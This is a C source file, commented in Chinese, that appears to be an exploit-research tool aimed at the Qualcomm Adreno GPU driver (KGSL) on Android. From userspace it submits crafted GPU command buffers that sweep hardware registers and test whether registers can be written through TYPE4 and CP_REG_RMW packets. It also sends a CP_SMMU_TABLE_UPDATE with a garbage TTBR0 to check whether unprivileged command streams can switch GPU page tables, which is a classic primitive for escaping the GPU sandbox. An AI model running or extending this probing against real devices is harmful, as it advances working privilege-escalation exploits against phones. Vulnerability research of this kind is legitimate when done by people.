/* kgsl_regscan.c — §BN 后续三项
 * sweep  : CP_REG_TO_MEM 批量扫 0x000-0x4FF + 0x600-0x8FF(批 64, fault 则二分隔离)
 * rmw    : CP_REG_RMW(0x21) / TYPE4 寄存器写 在 scratch 寄存器上试写+读回+恢复
 * smmu   : 正确 opcode 0x70D38003 {TTBR0_lo,hi,CONTEXTIDR}(垃圾 TTBR0 → fault=执行!) + 0x53 异常复测
 */
#define __BIONIC_DEPRECATED_PAGE_SIZE_MACRO
#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <errno.h>
#include <string.h>
#include "adrenaline.h"

static int fd;
static uint64_t g_clsz;
static uint32_t *ib, *out;
static uint64_t ib_ga, out_ga;

static void cache_op(void *start, void *end, int inval) {
    start = (char*)((uintptr_t)start & ~(g_clsz - 1));
    for (; start < end; start += g_clsz) {
        if (inval) __asm volatile("dc civac, %0" : : "r" (start) : "memory");
        else       __asm volatile("dc cvac, %0"  : : "r" (start) : "memory");
    }
    __asm volatile("dsb ish" ::: "memory");
}

static int ctx_create(uint32_t *ctx) {
    struct kgsl_drawctxt_create req = { .flags = 0x00001812 };
    int r = ioctl(fd, _IOWR(0x09, 0x13, struct kgsl_drawctxt_create), &req);
    if (r) return r;
    *ctx = req.drawctxt_id;
    return 0;
}
static void ctx_destroy(uint32_t ctx) {
    struct kgsl_drawctxt_destroy req = { .drawctxt_id = ctx };
    ioctl(fd, _IOW(0x09, 0x14, struct kgsl_drawctxt_destroy), &req);
}
static int gpu_command(uint32_t ctx, uint64_t gaddr, uint32_t size) {
    struct kgsl_command_object c;
    struct kgsl_gpu_command req;
    memset(&c, 0, sizeof(c));
    c.flags = KGSL_CMDLIST_IB;
    c.gpuaddr = gaddr; c.size = size;
    memset(&req, 0, sizeof(req));
    req.context_id = ctx;
    req.cmdsize = sizeof(c);
    req.numcmds = 1;
    req.cmdlist = (unsigned long)&c;
    return ioctl(fd, _IOWR(0x09, 0x4A, struct kgsl_gpu_command), &req);
}
static int canary(uint32_t ctx) {
    uint32_t *c = ib;
    *c++ = cp_type7_packet(CP_MEM_WRITE, 3);
    *c++ = lower_32_bits(out_ga + 0x700);
    *c++ = upper_32_bits(out_ga + 0x700);
    *c++ = 0xA5A5A5A5;
    cache_op((uint8_t*)ib, (uint8_t*)ib + 0x1000, 0);
    int r = gpu_command(ctx, ib_ga, 16);
    if (r) return -1;
    sleep(1);
    cache_op((uint8_t*)out, (uint8_t*)out + 0x1000, 1);
    return out[0x1C0] == 0xA5A5A5A5;
}
static void setup(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    uint64_t ctr; asm("mrs\t%x0, ctr_el0" : "=r"(ctr));
    g_clsz = 4 << ((ctr >> 16) & 0xf);
    fd = open("/dev/kgsl-3d0", O_RDWR | O_CLOEXEC);
    if (fd < 0) { printf("open fail\n"); exit(1); }
    ib = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    out = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    memset(ib, 0, 0x1000); memset(out, 0, 0x1000);
    struct kgsl_map_user_mem m;
    memset(&m, 0, sizeof(m));
    m.len = 0x1000; m.hostptr = (unsigned long)ib; m.memtype = KGSL_USER_MEM_TYPE_ADDR;
    if (ioctl(fd, _IOWR(0x09, 0x15, struct kgsl_map_user_mem), &m)) { printf("map ib fail\n"); exit(1); }
    ib_ga = m.gpuaddr;
    memset(&m, 0, sizeof(m));
    m.len = 0x1000; m.hostptr = (unsigned long)out; m.memtype = KGSL_USER_MEM_TYPE_ADDR;
    if (ioctl(fd, _IOWR(0x09, 0x15, struct kgsl_map_user_mem), &m)) { printf("map out fail\n"); exit(1); }
    out_ga = m.gpuaddr;
    printf("# ib_ga=0x%llx out_ga=0x%llx\n", (unsigned long long)ib_ga, (unsigned long long)out_ga);
}

/* ============ sweep ============ */
static uint32_t g_regs[4096];
static uint32_t g_nregs;

static int run_reg_batch(uint32_t *regs, int n) {
    /* n ≤ 64: 一个 IB 内 n 个 REG_TO_MEM, dst = out+0x400+4*i */
    uint32_t ctx;
    ctx_create(&ctx);
    uint32_t *c = ib;
    for (int i = 0; i < n; i++) {
        *c++ = cp_type7_packet(0x3e, 3);
        *c++ = regs[i];
        *c++ = lower_32_bits(out_ga + 0x400 + 4 * i);
        *c++ = upper_32_bits(out_ga + 0x400 + 4 * i);
    }
    cache_op((uint8_t*)ib, (uint8_t*)ib + 0x1000, 0);
    int r = gpu_command(ctx, ib_ga, (uint32_t)((c - ib) * 4));
    int cv = canary(ctx);
    ctx_destroy(ctx);
    if (r || cv != 1) return -1;
    cache_op((uint8_t*)out, (uint8_t*)out + 0x1000, 1);
    for (int i = 0; i < n; i++)
        printf("REG 0x%03x = 0x%08x\n", regs[i], out[0x100 + i]);
    return 0;
}
static void bisect_batch(uint32_t *regs, int n, int depth) {
    if (n == 1) {
        uint32_t ctx;
        ctx_create(&ctx);
        uint32_t *c = ib;
        *c++ = cp_type7_packet(0x3e, 3);
        *c++ = regs[0];
        *c++ = lower_32_bits(out_ga + 0x400);
        *c++ = upper_32_bits(out_ga + 0x400);
        cache_op((uint8_t*)ib, (uint8_t*)ib + 0x1000, 0);
        int r = gpu_command(ctx, ib_ga, 16);
        int cv = canary(ctx);
        ctx_destroy(ctx);
        cache_op((uint8_t*)out, (uint8_t*)out + 0x1000, 1);
        if (cv != 1)
            printf("REG 0x%03x = ***FAULT(保护?)***\n", regs[0]);
        else
            printf("REG 0x%03x = 0x%08x\n", regs[0], out[0x100]);
        return;
    }
    int h = n / 2;
    if (run_reg_batch(regs, h) < 0) bisect_batch(regs, h, depth + 1);
    if (run_reg_batch(regs + h, n - h) < 0) bisect_batch(regs + h, n - h, depth + 1);
}
static void do_sweep(void) {
    g_nregs = 0;
    for (uint32_t r = 0x000; r < 0x500; r++) g_regs[g_nregs++] = r;
    for (uint32_t r = 0x600; r < 0x900; r++) g_regs[g_nregs++] = r;
    printf("== REG_TO_MEM sweep, %u regs ==\n", g_nregs);
    for (uint32_t base = 0; base < g_nregs; base += 64) {
        int n = g_nregs - base > 64 ? 64 : (int)(g_nregs - base);
        printf("-- batch 0x%03x.. --\n", g_regs[base]);
        if (run_reg_batch(g_regs + base, n) < 0)
            bisect_batch(g_regs + base, n, 0);
    }
}

/* ============ rmw / TYPE4 写 ============ */
static uint32_t reg_read(uint32_t reg, int *ok) {
    uint32_t ctx;
    ctx_create(&ctx);
    uint32_t *c = ib;
    *c++ = cp_type7_packet(0x3e, 3);
    *c++ = reg;
    *c++ = lower_32_bits(out_ga + 0x600);
    *c++ = upper_32_bits(out_ga + 0x600);
    cache_op((uint8_t*)ib, (uint8_t*)ib + 0x1000, 0);
    int r = gpu_command(ctx, ib_ga, 16);
    sleep(1);
    int cv = canary(ctx);
    ctx_destroy(ctx);
    cache_op((uint8_t*)out, (uint8_t*)out + 0x1000, 1);
    *ok = (r == 0 && cv == 1);
    return out[0x180];
}
/* 单独一个写 op + 读回验证 */
static void write_test(const char *name, void (*build)(uint32_t*, uint32_t, uint32_t), uint32_t reg, uint32_t val) {
    uint32_t ctx;
    ctx_create(&ctx);
    uint32_t *c = ib;
    build(c, reg, val);
    cache_op((uint8_t*)ib, (uint8_t*)ib + 0x1000, 0);
    int r = gpu_command(ctx, ib_ga, 16);
    sleep(1);
    int cv = canary(ctx);
    ctx_destroy(ctx);
    int ok;
    uint32_t rb = reg_read(reg, &ok);
    printf("%-28s submit=%d canary=%d readback(0x%03x)=0x%08x %s\n", name, r, cv, reg, rb,
           (ok && rb == val) ? "<<< 寄存器写成功!!!" : (ok ? "(未变)" : "(读失败)"));
}
static void b_type4(uint32_t *c, uint32_t reg, uint32_t val) {
    *c++ = cp_register(reg, 1);          /* TYPE4: CP_REGISTER_WRITE */
    *c++ = val;
}
static void b_rmw(uint32_t *c, uint32_t reg, uint32_t val) {
    *c++ = cp_type7_packet(0x21, 3);     /* CP_REG_RMW: (reg & and) | or */
    *c++ = reg;
    *c++ = 0x00000000;                   /* and = 0 */
    *c++ = val;                          /* or  = val */
}
static void do_rmw(void) {
    int ok;
    printf("== 寄存器写原语测试 ==\n");
    uint32_t v611 = reg_read(0x611, &ok);
    printf("初始 0x611=0x%08x 0x61d=?\n", v611);
    write_test("TYPE4 write 0x611", b_type4, 0x611, 0xCAFED00D);
    write_test("TYPE4 write 0x612", b_type4, 0x612, 0xCAFED00D);
    write_test("RMW 0x611", b_rmw, 0x611, 0xFEEDF00D);
    write_test("RMW 0x61d", b_rmw, 0x61d, 0xFEEDF00D);
    write_test("TYPE4 write 0x200(对照)", b_type4, 0x200, 0xCAFED00D);
    /* 恢复 */
    if (ok && v611 != 0) {
        uint32_t ctx;
        ctx_create(&ctx);
        uint32_t *c = ib;
        b_type4(c, 0x611, v611);
        cache_op((uint8_t*)ib, (uint8_t*)ib + 0x1000, 0);
        gpu_command(ctx, ib_ga, 8);
        sleep(1);
        ctx_destroy(ctx);
        uint32_t rb = reg_read(0x611, &ok);
        printf("恢复 0x611=0x%08x %s\n", rb, rb == v611 ? "OK" : "FAIL");
    }
}

/* ============ smmu: 正确 opcode 0xD3 ============ */
static void do_smmu(void) {
    printf("== CP_SMMU_TABLE_UPDATE(opcode 0xD3, count=3) 垃圾 TTBR0 测试 ==\n");
    {
        uint32_t ctx;
        ctx_create(&ctx);
        uint32_t *c = ib;
        *c++ = cp_type7_packet(0xD3, 3);           /* 0x70D38003 */
        *c++ = lower_32_bits(0xdeadbeef000ull);    /* TTBR0 lo (垃圾) */
        *c++ = upper_32_bits(0xdeadbeef000ull);    /* TTBR0 hi */
        *c++ = 0;                                  /* CONTEXTIDR */
        *c++ = cp_type7_packet(CP_MEM_WRITE, 3);   /* 若页表已切换 → 此写必 fault */
        *c++ = lower_32_bits(out_ga + 0x600);
        *c++ = upper_32_bits(out_ga + 0x600);
        *c++ = 0xD3D3D3D3;
        cache_op((uint8_t*)ib, (uint8_t*)ib + 0x1000, 0);
        int r = gpu_command(ctx, ib_ga, 32);
        sleep(1);
        int cv = canary(ctx);
        cache_op((uint8_t*)out, (uint8_t*)out + 0x1000, 1);
        printf("0xD3: submit=%d canary=%d out[0x180]=0x%08x %s\n", r, cv, out[0x180],
               cv != 1 ? "<<< FAULT = 0xD3 从 IB1 执行了(TTBR0 已切换)!!!" :
               (out[0x180] == 0xD3D3D3D3 ? "跳过(MEM_WRITE 正常执行, 无切换)" : "?"));
        ctx_destroy(ctx);
    }
    /* 0x53 异常复测(干净缓冲) */
    {
        memset(out, 0, 0x1000);
        cache_op((uint8_t*)out, (uint8_t*)out + 0x1000, 0);
        uint32_t ctx;
        ctx_create(&ctx);
        uint32_t *c = ib;
        *c++ = cp_type7_packet(0x53, 4);
        *c++ = lower_32_bits(0xdeadbeef000ull);
        *c++ = upper_32_bits(0xdeadbeef000ull);
        *c++ = 0;
        *c++ = 0;
        *c++ = cp_type7_packet(CP_MEM_WRITE, 3);
        *c++ = lower_32_bits(out_ga + 0x600);
        *c++ = upper_32_bits(out_ga + 0x600);
        *c++ = 0x53330003;
        cache_op((uint8_t*)ib, (uint8_t*)ib + 0x1000, 0);
        int r = gpu_command(ctx, ib_ga, 36);
        sleep(1);
        int cv = canary(ctx);
        ctx_destroy(ctx);
        cache_op((uint8_t*)out, (uint8_t*)out + 0x1000, 1);
        printf("0x53(复测): submit=%d canary=%d out[0x180]=0x%08x (期望 0x53330003; 若为其他值 = 流被误解析)\n",
               r, cv, out[0x180]);
    }
}

int main(int argc, char **argv) {
    if (argc < 2) { printf("usage: regscan sweep|rmw|smmu\n"); return 1; }
    setup();
    if (!strcmp(argv[1], "sweep")) do_sweep();
    else if (!strcmp(argv[1], "rmw")) do_rmw();
    else if (!strcmp(argv[1], "smmu")) do_smmu();
    printf("done alive\n");
    return 0;
}
